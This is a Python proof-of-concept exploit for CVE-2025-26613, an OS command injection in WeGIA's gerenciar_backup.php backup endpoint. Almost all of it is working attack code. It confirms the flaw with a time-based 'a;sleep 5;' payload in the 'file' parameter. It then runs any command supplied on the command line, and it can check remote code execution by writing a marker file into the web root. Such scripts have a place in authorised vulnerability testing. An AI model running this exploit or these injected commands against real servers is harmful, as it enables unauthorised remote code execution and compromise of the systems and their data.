#!/usr/bin/env python3
import requests
import time
import sys
import argparse
import urllib.parse

def check_vulnerability(target_url, timeout=15):
    """
    CVE-2025-26613: OS Command Injection in WeGIA gerenciar_backup.php
    Uses time-based blind injection to verify vulnerability
    """
    vuln_endpoint = f"{target_url.rstrip('/')}/WeGIA/html/configuracao/gerenciar_backup.php"
    
    sleep_time = 5
    
    payload = {
        "file": f"a;sleep {sleep_time};",
        "action": "remove"
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    
    print(f"[*] Target: {vuln_endpoint}")
    print(f"[*] Testing OS Command Injection (CVE-2025-26613)")
    print(f"[*] Payload: file=a;sleep {sleep_time};")
    
    try:
        start_time = time.time()
        response = requests.post(
            vuln_endpoint,
            data=payload,
            headers=headers,
            timeout=timeout,
            allow_redirects=False
        )
        elapsed_time = time.time() - start_time
        
        print(f"[*] Response time: {elapsed_time:.2f} seconds")
        print(f"[*] HTTP Status: {response.status_code}")
        
        if elapsed_time >= sleep_time - 1:
            print(f"[+] VULNERABLE! Server delayed response by ~{elapsed_time:.2f}s")
            print(f"[+] OS Command Injection confirmed (CVE-2025-26613)")
            return True
        else:
            print(f"[-] Not vulnerable or patched. Response was too fast.")
            return False
            
    except requests.exceptions.Timeout:
        elapsed_time = time.time() - start_time
        print(f"[+] VULNERABLE! Request timed out after {elapsed_time:.2f}s")
        print(f"[+] OS Command Injection confirmed (CVE-2025-26613)")
        return True
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def execute_command(target_url, command, timeout=30):
    """
    Execute arbitrary command via command injection
    """
    vuln_endpoint = f"{target_url.rstrip('/')}/WeGIA/html/configuracao/gerenciar_backup.php"
    
    payload = {
        "file": f"a;{command};",
        "action": "remove"
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    
    print(f"[*] Executing command: {command}")
    
    try:
        response = requests.post(
            vuln_endpoint,
            data=payload,
            headers=headers,
            timeout=timeout,
            allow_redirects=False
        )
        print(f"[*] Command sent, HTTP Status: {response.status_code}")
        return True
    except requests.exceptions.Timeout:
        print(f"[*] Request timed out (command may still have executed)")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def verify_rce(target_url):
    """
    Verify RCE by creating a file and checking if it exists
    """
    test_filename = "poc_test_cve2025_26613.txt"
    test_content = "CVE-2025-26613-PWNED"
    
    create_cmd = f"echo '{test_content}' > /var/www/html/WeGIA/{test_filename}"
    execute_command(target_url, create_cmd)
    
    time.sleep(2)
    
    check_url = f"{target_url.rstrip('/')}/WeGIA/{test_filename}"
    try:
        response = requests.get(check_url, timeout=10)
        if test_content in response.text:
            print(f"[+] RCE VERIFIED! File created at: {check_url}")
            
            cleanup_cmd = f"rm /var/www/html/WeGIA/{test_filename}"
            execute_command(target_url, cleanup_cmd)
            print(f"[*] Cleanup: test file removed")
            return True
        else:
            print(f"[-] Could not verify file creation")
            return False
    except Exception as e:
        print(f"[-] Error verifying RCE: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-26613 PoC - WeGIA OS Command Injection")
    parser.add_argument("-t", "--target", default="http://localhost:8081", help="Target URL")
    parser.add_argument("-c", "--command", help="Command to execute (optional)")
    parser.add_argument("--verify-rce", action="store_true", help="Verify RCE by creating a test file")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-26613 - WeGIA OS Command Injection PoC")
    print("Vulnerable: WeGIA <= 3.2.13")
    print("Endpoint: POST /html/configuracao/gerenciar_backup.php")
    print("Parameter: file")
    print("=" * 60)
    
    is_vuln = check_vulnerability(args.target)
    
    if is_vuln and args.verify_rce:
        print("\n[*] Verifying RCE capability...")
        verify_rce(args.target)
    
    if is_vuln and args.command:
        print(f"\n[*] Executing custom command...")
        execute_command(args.target, args.command)
    
    sys.exit(0 if is_vuln else 1)
